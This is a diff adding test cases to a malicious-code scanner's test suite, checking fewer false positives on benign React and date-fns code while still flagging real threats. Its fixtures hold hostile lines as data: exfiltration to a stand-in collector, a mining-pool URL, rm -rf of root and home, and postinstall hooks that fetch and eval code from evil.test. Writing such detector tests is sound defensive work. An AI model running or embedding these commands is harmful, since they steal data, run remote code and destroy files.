@@ -1315,3 +1315,177 @@ describe("backdoor pattern precision (false positive fixed in 0.7.1)", () => {
     ).toBe(true)
   })
 })
+
+describe("false positives the per-file cap used to hide", () => {
+  // Each pattern now needs the context that makes it a signal. Every case
+  // below is real code from a real repo.
+
+  it("does not read SVG path data as a hardcoded C2 address", async () => {
+    // React's GitHub icon. Compressed path data packs coordinates without
+    // separators, so `c2.91.83.1` reads as a dotted quad.
+    const result = await scan({
+      "components/IconGitHub.tsx": [
+        `export const IconGitHub = () => (`,
+        `  <svg viewBox="0 0 24 24">`,
+        `    <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385`,
+        `      .6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61`,
+        `      C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084`,
+        `      1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605` + `" />`,
+        `  </svg>`,
+        `)`,
+      ].join("\n"),
+    })
+    expect(result.findings.filter((f) => f.type === "NETWORK_COMMUNICATION")).toHaveLength(0)
+  })
+
+  it("still reports an IP that is actually used as an endpoint", async () => {
+    const result = await scan({
+      "src/beacon.js": [
+        `fetch("http://185.220.101.5/collect", { method: "POST", body: data })`,
+        `net.connect(4444, '91.92.240.17')`,
+      ].join("\n"),
+    })
+    const network = result.findings.filter((f) => f.type === "NETWORK_COMMUNICATION")
+    expect(network).toHaveLength(1)
+    expect(network[0]!.description).toContain("Hardcoded IP Address")
+    expect(network[0]!.description).toContain("2 occurrence")
+  })
+
+  it("does not read an ordinary form field as exfiltration", async () => {
+    // React's own ReactInputSelection.js reads input.value, as does any
+    // controlled input.
+    const result = await scan({
+      "src/ReactInputSelection.js": [
+        `function getSelection(input) {`,
+        `  const start = input.selectionStart`,
+        `  const text = input.value.slice(start)`,
+        `  return { start, text }`,
+        `}`,
+        `const onChange = (e) => setEmail(emailInput.value)`,
+      ].join("\n"),
+    })
+    expect(result.findings.filter((f) => f.type === "DATA_EXFILTRATION")).toHaveLength(0)
+  })
+
+  it("still reports a form field read and sent, and a password field read", async () => {
+    const sent = await scan({
+      "src/steal.js": [
+        `const creds = emailInput.value`,
+        `fetch("https://collector.test/x", { method: "POST", body: creds })`,
+      ].join("\n"),
+    })
+    expect(sent.findings.some((f) => f.type === "DATA_EXFILTRATION")).toBe(true)
+
+    const password = await scan({
+      "src/form.js": `const p = passwordField.value\nstore(p)\n`,
+    })
+    expect(password.findings.some((f) => f.type === "DATA_EXFILTRATION")).toBe(true)
+  })
+
+  it("does not read the English word 'pool' as a crypto miner", async () => {
+    // Four of React's reconciler files describe its event pool this way and
+    // each was reported as a critical-severity crypto miner.
+    const result = await scan({
+      "src/SyntheticEvent.js": [
+        `// Instances of this class are pooled; when an event is done being`,
+        `// dispatched it is released back into the pool.`,
+        `function releaseTopLevelCallbackBookKeeping(instance) {`,
+        `  instance.destructor()`,
+        `  if (eventQueue.length < 10) eventQueue.push(instance)`,
+        `}`,
+      ].join("\n"),
+    })
+    expect(result.findings.filter((f) => f.type === "CRYPTO_MINER")).toHaveLength(0)
+  })
+
+  it("still reports a mining pool host", async () => {
+    const result = await scan({
+      "src/miner.js": [
+        `const url = "stratum+tcp://pool.supportxmr.com:3333"`,
+        `startMiner(url, "monero")`,
+      ].join("\n"),
+    })
+    expect(result.findings.some((f) => f.type === "CRYPTO_MINER")).toBe(true)
+  })
+
+  it("does not read a build script clearing its own output as destructive", async () => {
+    // date-fns' build script. A wildcard is not what makes rm -rf dangerous.
+    const result = await scan({
+      "scripts/build/package.sh": [
+        `#!/usr/bin/env bash`,
+        `rm -rf "$dist"`,
+        `rm -rf "$main_dir"/fp*`,
+        `rm -rf "$main_dir"/locale* "$main_dir"/docs`,
+        `rm -rf ./build/*`,
+      ].join("\n"),
+    })
+    expect(
+      result.findings.filter(
+        (f) =>
+          f.type === "SUSPICIOUS_FILE_ACCESS" && f.description.includes("Destructive File Deletion")
+      )
+    ).toHaveLength(0)
+  })
+
+  it("still reports a deletion rooted at the filesystem root or home", async () => {
+    for (const line of [`rm -rf /`, `rm -rf ~/Documents`, `rm -rf "$HOME"/*`, `rm -rf /etc/ssh`]) {
+      const result = await scan({ "install.sh": `#!/bin/sh\n${line}\n` })
+      expect(
+        result.findings.some(
+          (f) =>
+            f.type === "SUSPICIOUS_FILE_ACCESS" &&
+            f.description.includes("Destructive File Deletion")
+        )
+      ).toBe(true)
+    }
+  })
+})
+
+describe("install scripts that only look like dynamic code", () => {
+  const withScript = (postinstall: string) =>
+    scan({ "package.json": JSON.stringify({ name: "app", scripts: { postinstall } }) })
+
+  it("does not call running a local binary through a package manager dynamic code", async () => {
+    // `includes("exec")` earned this finding critical severity, so every
+    // package manager's own run subcommand qualified — zod's
+    // `nub exec --node fumadocs-mdx` among them.
+    for (const script of [
+      "nub exec --node fumadocs-mdx",
+      "npm exec tsc",
+      "pnpm exec husky install",
+      "yarn exec prettier --write .",
+      "node scripts/postinstall.js",
+      "patch-package",
+      "evaluate-metrics --once",
+    ]) {
+      const result = await withScript(script)
+      expect(
+        result.findings.filter((f) => f.type === "POSTINSTALL_SCRIPT"),
+        `expected no postinstall finding for: ${script}`
+      ).toHaveLength(0)
+    }
+  })
+
+  it("still reports an install script that executes code it builds or fetches", async () => {
+    for (const script of [
+      `eval "$(curl -fsSL https://evil.test/s)"`,
+      `node -e "require('child_process').exec('id')"`,
+      `node --eval "process.exit()"`,
+      `deno eval "fetch('http://evil.test')"`,
+      `bash -c "$(wget -qO- http://evil.test/s)"`,
+    ]) {
+      const result = await withScript(script)
+      expect(
+        result.findings.some(
+          (f) => f.type === "POSTINSTALL_SCRIPT" && f.severity === "critical"
+        ),
+        `expected a critical postinstall finding for: ${script}`
+      ).toBe(true)
+    }
+  })
+
+  it("still reports an install script that pipes a download into a shell", async () => {
+    const result = await withScript("curl https://example.com/setup.sh | bash")
+    expect(result.findings.some((f) => f.type === "POSTINSTALL_SCRIPT")).toBe(true)
+  })
+})
